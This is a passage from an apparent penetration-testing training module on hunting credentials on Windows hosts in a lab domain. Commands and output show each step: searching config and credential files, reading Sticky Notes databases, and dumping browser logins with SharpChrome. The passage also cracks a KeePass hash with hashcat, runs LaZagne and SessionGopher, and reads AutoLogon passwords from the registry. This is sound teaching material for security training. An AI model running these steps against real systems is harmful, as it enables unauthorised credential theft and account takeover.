c:<span class="hljs-symbol">\i</span>netpub<span class="hljs-symbol">\w</span>wwroot<span class="hljs-symbol">\w</span>eb.config
</code></pre>
<p>Similarly, we can search the file system for certain file extensions with a command such as:</p>
<p><strong>Search for File Extensions Using PowerShell</strong></p>
<p>Other Files</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-ChildItem C:\ -Recurse -Include *<span class="hljs-selector-class">.rdp</span>, *<span class="hljs-selector-class">.config</span>, *<span class="hljs-selector-class">.vnc</span>, *<span class="hljs-selector-class">.cred</span> -ErrorAction Ignore


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         <span class="hljs-number">5</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">9</span>:<span class="hljs-number">59</span> AM            <span class="hljs-number">329</span> web<span class="hljs-selector-class">.config</span>

&lt;SNIP&gt;
</code></pre>
<hr>
<h3 id="sticky-notes-passwords">Sticky Notes Passwords</h3>
<p>People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at <code>C:\Users\&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code> and is always worth searching for and examining.</p>
<p><strong>Looking for StickyNotes DB Files</strong></p>
<p>Other Files</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; ls


    Directory: C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState


Mode                 LastWriteTime         Length Name
-<span class="ruby">---                 -------------         ------ ----
</span>-<span class="ruby">a----         <span class="hljs-number">5</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span> AM          <span class="hljs-number">20480</span> <span class="hljs-number">15</span>cbbc93e90a4d56bf8d9a29305b8981.storage.session
</span>-<span class="ruby">a----         <span class="hljs-number">5</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span> AM            <span class="hljs-number">982</span> Ecs.dat
</span>-<span class="ruby">a----         <span class="hljs-number">5</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span> AM           <span class="hljs-number">4096</span> plum.sqlite
</span>-<span class="ruby">a----         <span class="hljs-number">5</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span> AM          <span class="hljs-number">32768</span> plum.sqlite-shm
</span>-<span class="ruby">a----         <span class="hljs-number">5</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span> PM         <span class="hljs-number">197792</span> plum.sqlite-wal</span>
</code></pre>
<p>We can copy the three <code>plum.sqlite*</code> files down to our system and open them with a tool such as <a href="https://sqlitebrowser.org/dl/">DB Browser for SQLite</a> and view the <code>Text</code> column in the <code>Note</code> table with the query <code>select Text from Note;</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/stickynote.png" alt="image"></p>
<p><strong>Viewing Sticky Notes Data Using PowerShell</strong></p>
<p>This can also be done with PowerShell using the <a href="https://github.com/RamblingCookieMonster/PSSQLite">PSSQLite module</a>. First, import the module, point to a data source (in this case, the SQLite database file used by the StickNotes app), and finally query the <code>Note</code> table and look for any interesting data. This can also be done from our attack machine after downloading the <code>.sqlite</code> file or remotely via WinRM.</p>
<p>Other Files</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\htb&gt;</span> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you <span class="hljs-keyword">from</span> scripts <span class="hljs-literal">that</span> you <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> trust. Changing the execution policy might expose
you <span class="hljs-keyword">to</span> the security risks described <span class="hljs-keyword">in</span> the about_Execution_Policies help topic at
https:<span class="hljs-regexp">/go.microsoft.com/fwlink/</span>?LinkID=<span class="hljs-number">135170.</span> Do you want <span class="hljs-keyword">to</span> change the execution policy?
[Y] Yes  [A] Yes <span class="hljs-keyword">to</span> All  [N] No  [L] No <span class="hljs-keyword">to</span> All  [S] Suspend  [?] Help (<span class="hljs-keyword">default</span> <span class="hljs-keyword">is</span> <span class="hljs-string">"N"</span>): A

PS C:<span class="hljs-string">\htb&gt;</span> cd .<span class="hljs-string">\PSSQLite\</span>
PS C:<span class="hljs-string">\htb&gt;</span> Import-Module .<span class="hljs-string">\PSSQLite.psd1</span>
PS C:<span class="hljs-string">\htb&gt;</span> $db = <span class="hljs-string">'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'</span>
PS C:<span class="hljs-string">\htb&gt;</span> Invoke-SqliteQuery -Database $db -Query <span class="hljs-string">"SELECT Text FROM Note"</span> | ft -wrap

Text
----
<span class="hljs-string">\id=de368df0-6939-4579-8d38-0fda521c9bc4</span> vCenter
<span class="hljs-string">\id=e4adae4c-a40b-48b4-93a5-900247852f96</span>
<span class="hljs-string">\id=1a44a631-6fff-4961-a4df-27898e9e1e65</span> root:Vc3nt3R_adm1n!
<span class="hljs-string">\id=c450fc5f-dc51-4412-b4ac-321fd41c522a</span> Thycotic demo tomorrow at <span class="hljs-number">10am</span>
</code></pre>
<p><strong>Strings to View DB File Contents</strong></p>
<p>We can also copy them over to our attack box and search through the data using the <code>strings</code> command, which may be less efficient depending on the size of the database.</p>
<p>Other Files</p>
<pre><code class="lang-shell-session">root@htb[/htb]$  strings plum.sqlite-wal

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">"Note"</span> (
<span class="hljs-string">"Text"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"WindowPosition"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"IsOpen"</span> <span class="hljs-built_in">integer</span> ,
<span class="hljs-string">"IsAlwaysOnTop"</span> <span class="hljs-built_in">integer</span> ,
<span class="hljs-string">"CreationNoteIdAnchor"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"Theme"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"IsFutureNote"</span> <span class="hljs-built_in">integer</span> ,
<span class="hljs-string">"RemoteId"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"ChangeKey"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"LastServerVersion"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"RemoteSchemaVersion"</span> <span class="hljs-built_in">integer</span> ,
<span class="hljs-string">"IsRemoteDataInvalid"</span> <span class="hljs-built_in">integer</span> ,
<span class="hljs-string">"PendingInsightsScan"</span> <span class="hljs-built_in">integer</span> ,
<span class="hljs-string">"Type"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"Id"</span> <span class="hljs-built_in">varchar</span> primary <span class="hljs-keyword">key</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">null</span> ,
<span class="hljs-string">"ParentId"</span> <span class="hljs-built_in">varchar</span> ,
<span class="hljs-string">"CreatedAt"</span> <span class="hljs-built_in">bigint</span> ,
<span class="hljs-string">"DeletedAt"</span> <span class="hljs-built_in">bigint</span> ,
<span class="hljs-string">"UpdatedAt"</span> <span class="hljs-built_in">bigint</span> )<span class="hljs-string">'
indexsqlite_autoindex_Note_1Note
af907b1b-1eef-4d29-b238-3ea74f7ffe5caf907b1b-1eef-4d29-b238-3ea74f7ffe5c
U    af907b1b-1eef-4d29-b238-3ea74f7ffe5c
Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c
U    93b49900-6530-42e0-b35c-2663989ae4b3


&lt; SNIP &gt;

\id=011f29a4-e37f-451d-967e-c42b818473c2 vCenter
\id=34910533-ddcf-4ac4-b8ed-3d1f10be9e61 alright*
\id=ffaea2ff-b4fc-4a14-a431-998dc833208c root:Vc3nt3R_adm1n!ManagedPosition=Yellow93b49900-6530-42e0-b35c-2663989ae4b3af907b1b-1eef-4d29-b238-3ea74f7ffe5c

&lt;SNIP &gt;</span>
</code></pre>
<hr>
<h3 id="other-files-of-interest">Other Files of Interest</h3>
<p><strong>Other Interesting Files</strong></p>
<p>Some other files we may find credentials in include the following:</p>
<p>Other Files</p>
<pre><code class="lang-shell-session"><span class="hljs-variable">%SYSTEMDRIVE%</span><span class="hljs-symbol">\p</span>agefile.sys
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\d</span>ebug<span class="hljs-symbol">\N</span>etSetup.log
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>am
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>ystem
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>oftware, <span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\r</span>epair<span class="hljs-symbol">\s</span>ecurity
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\i</span>is6.log
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\A</span>ppEvent.Evt
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\S</span>ecEvent.Evt
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\d</span>efault.sav
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\s</span>ecurity.sav
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\s</span>oftware.sav
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>onfig<span class="hljs-symbol">\s</span>ystem.sav
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\C</span>CM<span class="hljs-symbol">\l</span>ogs<span class="hljs-symbol">\*</span>.log
<span class="hljs-variable">%USERPROFILE%</span><span class="hljs-symbol">\n</span>tuser.dat
<span class="hljs-variable">%USERPROFILE%</span><span class="hljs-symbol">\L</span>ocalS~1<span class="hljs-symbol">\T</span>empor~1<span class="hljs-symbol">\C</span>ontent.IE5<span class="hljs-symbol">\i</span>ndex.dat
<span class="hljs-variable">%WINDIR%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\d</span>rivers<span class="hljs-symbol">\e</span>tc<span class="hljs-symbol">\h</span>osts
C:<span class="hljs-symbol">\P</span>rogramData<span class="hljs-symbol">\C</span>onfigs<span class="hljs-symbol">\*</span>
C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\W</span>indows PowerShell<span class="hljs-symbol">\*</span>
</code></pre>
<p>Some of the privilege escalation enumeration scripts listed earlier in this module search for most, if not all, of the files/extensions mentioned in this section. Nevertheless, we must understand how to search for these manually and not only rely on tools. Furthermore, we may find interesting files that enumeration scripts do not look for and wish to modify the scripts to include them.</p>
<h2 id="further-credential-theft">Further Credential Theft</h2>
<hr>
<p>There are many other techniques we can use to potentially obtain credentials on a Windows system. This section will not cover every possible scenario, but we will walk through the most common scenarios.</p>
<hr>
<h3 id="cmdkey-saved-credentials">Cmdkey Saved Credentials</h3>
<p><strong>Listing Saved Credentials</strong></p>
<p>The <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey">cmdkey</a> command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password. This may help us either move laterally to another system with a different user or escalate privileges on the current host to leverage stored credentials for another user.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; cmdkey /list
<span class="hljs-symbol">
    Target:</span> LegacyGeneric:target=TERMSRV/SQL01
<span class="hljs-symbol">    Type:</span> Generic
<span class="hljs-symbol">    User:</span> inlanefreight\bob
</code></pre>
<p>When we attempt to RDP to the host, the saved credentials will be used.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/cmdkey\_rdp.png" alt="image"></p>
<p>We can also attempt to reuse the credentials using <code>runas</code> to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:</p>
<p><strong>Run Commands as Another User</strong></p>
<p>Further Credential Theft</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; runas <span class="hljs-regexp">/savecred /</span><span class="hljs-string">user:</span>inlanefreight\bob <span class="hljs-string">"COMMAND HERE"</span>
</code></pre>
<hr>
<h3 id="browser-credentials">Browser Credentials</h3>
<p><strong>Retrieving Saved Credentials from Chrome</strong></p>
<p>Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as <a href="https://github.com/GhostPack/SharpDPAPI">SharpChrome</a> to retrieve cookies and saved logins from Google Chrome.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; .<span class="hljs-symbol">\S</span>harpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) <span class="hljs-symbol">\_</span> | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\L</span>ocal State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\D</span>efault<span class="hljs-symbol">\L</span>ogin Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\b</span>ob<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\D</span>efault<span class="hljs-symbol">\L</span>ogin Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1
</code></pre>
<hr>
<h3 id="password-managers">Password Managers</h3>
<p>Many companies provide password managers to their users. This may be in the form of a desktop application such as <code>KeePass</code>, a cloud-based solution such as <code>1Password</code>, or an enterprise password vault such as <code>Thycotic</code> or <code>CyberArk</code>. Gaining access to a password manager, especially one utilized by a member of the IT staff or an entire department, may lead to administrator-level access to high-value targets such as network devices, servers, databases, etc. We may gain access to a password vault through password reuse or guessing a weak/common password. Some password managers such as <code>KeePass</code> are stored locally on the host. If we find a <code>.kdbx</code> file on a server, workstation, or file share, we know we are dealing with a <code>KeePass</code> database which is often protected by just a master password. If we can download a <code>.kdbx</code> file to our attacking host, we can use a tool such as <a href="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py">keepass2john</a> to extract the password hash and run it through a password cracking tool such as <a href="https://github.com/hashcat">Hashcat</a> or <a href="https://github.com/openwall/john">John the Ripper</a>.</p>
<p><strong>Extracting KeePass Hash</strong></p>
<p>First, we extract the hash in Hashcat format using the <code>keepass2john.py</code> script.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python2.<span class="hljs-number">7</span> keepass2john<span class="hljs-selector-class">.py</span> ILFREIGHT_Help_Desk<span class="hljs-selector-class">.kdbx</span> 

ILFREIGHT_Help_Desk:<span class="hljs-variable">$keepass</span>$*<span class="hljs-number">2</span>*<span class="hljs-number">60000</span>*<span class="hljs-number">222</span>*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*<span class="hljs-number">2</span>e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*<span class="hljs-number">7</span>df525a2b843990840b249324d55b6ce*<span class="hljs-number">75</span>e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*<span class="hljs-number">63</span>fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
</code></pre>
<p><strong>Cracking Hash Offline</strong></p>
<p>We can then feed the hash to Hashcat, specifying <a href="https://hashcat.net/wiki/doku.php?id=example\_hashes">hash mode</a> 13400 for KeePass. If successful, we may gain access to a wealth of credentials that can be used to access other applications/systems or even network devices, servers, databases, etc., if we can gain access to a password database used by IT staff.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -m <span class="hljs-number">13400</span> keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6<span class="hljs-number">.1</span><span class="hljs-number">.1</span>) starting...

&lt;SNIP&gt;

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="hljs-number">14344385</span>
* Bytes.....: <span class="hljs-number">139921507</span>
* Keyspace..: <span class="hljs-number">14344385</span>

$keepass$*<span class="hljs-number">2</span>*<span class="hljs-number">60000</span>*<span class="hljs-number">222</span>*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*<span class="hljs-number">2e8</span>b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*<span class="hljs-number">7</span>df525a2b843990840b249324d55b6ce*<span class="hljs-number">75e830162</span>befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*<span class="hljs-number">63</span>fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1

Session..........: hashcat
Status...........: Cracked
Hash.Name........: KeePass <span class="hljs-number">1</span> (AES/Twofish) and KeePass <span class="hljs-number">2</span> (AES)
Hash.Target......: $keepass$*<span class="hljs-number">2</span>*<span class="hljs-number">60000</span>*<span class="hljs-number">222</span>*f49632ef7dae20e5a670bdec2365d..<span class="hljs-number">.39</span>c154
Time.Started.....: Fri Aug  <span class="hljs-number">6</span> <span class="hljs-number">11</span>:<span class="hljs-number">17</span>:<span class="hljs-number">47</span> <span class="hljs-number">2021</span> (<span class="hljs-number">22</span> secs)
Time.Estimated...: Fri Aug  <span class="hljs-number">6</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">09</span> <span class="hljs-number">2021</span> (<span class="hljs-number">0</span> secs)
Guess.Base.......: File (/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:      <span class="hljs-number">276</span> H/s (<span class="hljs-number">4.79</span>ms) @ Accel:<span class="hljs-number">1024</span> Loops:<span class="hljs-number">16</span> Thr:<span class="hljs-number">1</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests
Progress.........: <span class="hljs-number">6144</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.04</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">6144</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">0</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">0.00</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">59984</span><span class="hljs-number">-60000</span>
Candidates.#<span class="hljs-number">1.</span>...: <span class="hljs-number">123456</span> -&gt; iheartyou

Started: Fri Aug  <span class="hljs-number">6</span> <span class="hljs-number">11</span>:<span class="hljs-number">17</span>:<span class="hljs-number">45</span> <span class="hljs-number">2021</span>
Stopped: Fri Aug  <span class="hljs-number">6</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">11</span> <span class="hljs-number">2021</span>
</code></pre>
<hr>
<h3 id="email">Email</h3>
<p>If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user&#39;s email for terms such as &quot;pass,&quot; &quot;creds,&quot; &quot;credentials,&quot; etc. using the tool <a href="https://github.com/dafthack/MailSniper">MailSniper</a>.</p>
<hr>
<h3 id="more-fun-with-credentials">More Fun with Credentials</h3>
<p>When all else fails, we can run the <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> tool in an attempt to retrieve credentials from a wide variety of software. Such software includes web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.). The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., OpenVPN). The output can be saved to a standard text file or in JSON format. Let&#39;s take it for a spin.</p>
<p><strong>Viewing LaZagne Help Menu</strong></p>
<p>We can view the help menu with the <code>-h</code> flag.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; .\lazagne.exe -h

usage: lazagne.exe [-h] [-version]
                   {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                   ...

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

positional arguments:
  {chats,mails,all,git,svn,windows,wifi,maven,sysadmin,browsers,games,multimedia,memory,databases,php}
                        Choose a main command
    chats               <span class="hljs-keyword">Run</span><span class="bash"> chats module
</span>    mails               <span class="hljs-keyword">Run</span><span class="bash"> mails module
</span>    all                 <span class="hljs-keyword">Run</span><span class="bash"> all modules
</span>    git                 <span class="hljs-keyword">Run</span><span class="bash"> git module
</span>    svn                 <span class="hljs-keyword">Run</span><span class="bash"> svn module
</span>    windows             <span class="hljs-keyword">Run</span><span class="bash"> windows module
</span>    wifi                <span class="hljs-keyword">Run</span><span class="bash"> wifi module
</span>    maven               <span class="hljs-keyword">Run</span><span class="bash"> maven module
</span>    sysadmin            <span class="hljs-keyword">Run</span><span class="bash"> sysadmin module
</span>    browsers            <span class="hljs-keyword">Run</span><span class="bash"> browsers module
</span>    games               <span class="hljs-keyword">Run</span><span class="bash"> games module
</span>    multimedia          <span class="hljs-keyword">Run</span><span class="bash"> multimedia module
</span>    memory              <span class="hljs-keyword">Run</span><span class="bash"> memory module
</span>    databases           <span class="hljs-keyword">Run</span><span class="bash"> databases module
</span>    php                 <span class="hljs-keyword">Run</span><span class="bash"> php module
</span>
optional arguments:
  -h, --help            show this help message and exit
  -version              laZagne version
</code></pre>
<p><strong>Running All LaZagne Modules</strong></p>
<p>As we can see, there are many modules available to us. Running the tool with <code>all</code> will search for supported applications and return any discovered cleartext credentials. As we can see from the example below, many applications do not store credentials securely (best never to store credentials, period!). They can easily be retrieved and used to escalate privileges locally, move on to another system, or access sensitive data.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: <span class="hljs-number">22</span>

------------------- Credman passwords -----------------

[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q <span class="hljs-number">1</span>

[+] <span class="hljs-number">2</span> passwords have been found.

For more information launch it again <span class="hljs-keyword">with</span> the -v option

elapsed time = <span class="hljs-number">5.50499987602</span>
</code></pre>
<hr>
<h3 id="even-more-fun-with-credentials">Even More Fun with Credentials</h3>
<p>We can use <a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a> to extract saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials. The tool is written in PowerShell and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the <code>HKEY_USERS</code> hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid) files.</p>
<p><strong>Running SessionGopher as Current User</strong></p>
<p>We need local admin access to retrieve stored session information for every user in <code>HKEY_USERS</code>, but it is always worth running as our current user to see if we can find any useful credentials.</p>
<p>Further Credential Theft</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Import-Module .\SessionGopher.ps1

PS C:\Tools&gt; Invoke-SessionGopher -Target WINLPE-SRV01

          o_
         /  <span class="hljs-string">".   SessionGopher
       ,"</span>  _-<span class="hljs-string">"
     ,"</span>   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com

[+] Digging on WINLPE-SRV01...
WinSCP Sessions


Source   : <span class="hljs-type">WINLPE</span>-SRV01\htb-student
Session  : <span class="hljs-type">Default</span>%<span class="hljs-number">20</span>Settings
Hostname :
<span class="hljs-type">Username</span> :
<span class="hljs-type">Password</span> :


<span class="hljs-type">PuTTY</span> Sessions


Source   : <span class="hljs-type">WINLPE</span>-SRV01\htb-student
Session  : <span class="hljs-type">nix03</span>
Hostname : <span class="hljs-type">nix03.inlanefreight.local</span>



SuperPuTTY Sessions


Source        : <span class="hljs-type">WINLPE</span>-SRV01\htb-student
SessionId     : <span class="hljs-type">NIX03</span>
SessionName   : <span class="hljs-type">NIX03</span>
Host          : <span class="hljs-type">nix03.inlanefreight.local</span>
Username      : <span class="hljs-type">srvadmin</span>
ExtraArgs     :
<span class="hljs-type">Port</span>          : 22
Putty Session : <span class="hljs-type">Default</span> Settings
</code></pre>
<hr>
<h3 id="clear-text-password-storage-in-the-registry">Clear-Text Password Storage in the Registry</h3>
<p>Certain programs and windows configurations can result in clear-text passwords or other data being stored in the registry. While tools such as <code>Lazagne</code> and <code>SessionGopher</code> are a great way to extract credentials, as penetration testers we should also be familiar and comfortable with enumerating them manually.</p>
<h4 id="windows-autologon">Windows AutoLogon</h4>
<p>Windows <a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon">Autologon</a> is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text. This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security.</p>
<p>The registry keys associated with Autologon can be found under <code>HKEY_LOCAL_MACHINE</code> in the following hive, and can be accessed by standard users:</p>
<p>Code: cmd</p>
<pre><code class="lang-cmd">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon
</code></pre>
<p>The typical configuration of an Autologon account involves the manual setting of the following registry keys:</p>
<ul>
<li><code>AdminAutoLogon</code> - Determines whether Autologon is enabled or disabled. A value of &quot;1&quot; means it is enabled.</li>
<li><code>DefaultUserName</code> - Holds the value of the username of the account that will automatically log on.</li>
<li><code>DefaultPassword</code> - Holds the value of the password for the user account specified previously.</li>
</ul>
<p><strong>Enumerating Autologon with reg.exe</strong></p>
<p>Further Credential Theft</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt;reg query "HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon"

HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\W</span>inlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0

    &lt;SNIP&gt;

    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
</code></pre>
<p><code>Note:</code> If you absolutely must configure Autologon for your windows system, it is recommended to use Autologon.exe from the Sysinternals suite, which will encrypt the password as an LSA secret.</p>
<h4 id="putty">Putty</h4>
<p>For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.</p>
<p>Code: cmd</p>
